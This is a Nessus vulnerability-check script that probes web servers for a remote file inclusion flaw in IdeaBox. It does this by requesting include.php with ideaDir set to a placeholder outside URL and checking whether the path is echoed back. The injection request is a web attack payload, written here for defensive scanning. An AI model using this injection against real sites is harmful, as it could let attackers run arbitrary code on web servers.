#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
#
# Date: Tue, 29 Apr 2003 15:06:43 +0400 (MSD)
# From: "euronymous" <just-a-user@yandex.ru>
# To: bugtraq@securityfocus.com
# Subject: IdeaBox: Remote Command Execution


if(description)
{
 script_id(11557);
 script_bugtraq_id(7488);
 script_version ("$Revision: 1.8 $");

 name["english"] = "ideabox code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using ideabox.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade to the latest version of IdeaBox
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Injects a path";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if( ! get_port_state(port)    ) exit(0);
if( ! can_host_php(port:port) ) exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/include.php?ideaDir=http://xxxxxxxx"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*http://xxxxxxxx/user\.php", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
  dirs = make_list(dirs, string(d, "/ideabox"));

dirs = make_list(dirs, "", "/ideabox");



foreach dir (dirs)
{
 check(loc:dir);
}
